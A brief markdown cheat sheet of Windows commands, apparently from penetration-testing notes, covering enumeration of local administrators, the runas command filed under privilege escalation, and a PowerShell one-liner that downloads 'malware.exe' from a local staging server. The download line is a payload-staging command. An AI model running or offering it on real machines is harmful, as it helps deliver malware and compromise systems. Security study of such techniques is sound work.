# Windows

## Command Prompt
**Local Administrators**
```
net localgroup administrators
```

**Elevating Privileges**
```
runas
```

## PowerShell
**Download a File**
```pwsh
iwr http://192.168.1.23:8000/malware.exe -o malware.exe
```